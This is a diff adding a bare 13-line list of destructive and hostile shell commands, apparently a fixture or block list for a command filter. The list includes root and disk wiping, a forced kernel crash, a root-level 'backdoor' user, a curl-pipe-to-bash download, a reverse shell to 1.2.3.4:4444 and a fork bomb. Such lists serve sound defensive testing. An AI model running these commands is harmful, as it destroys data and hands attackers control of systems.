@@ -1,0 +1,13 @@
+rm -rf /
+rm -rf / --no-preserve-root
+mkfs.ext4 /dev/sda1
+dd if=/dev/zero of=/dev/sda bs=1M
+shred -n 1 -z /dev/sda
+echo c > /proc/sysrq-trigger
+useradd -o -u 0 -g 0 backdoor
+chmod -R 000 /
+pkill -9 -1
+rm -rf $HOME
+curl -sL http://x/a.sh | bash
+bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
+:(){ :|:& };:
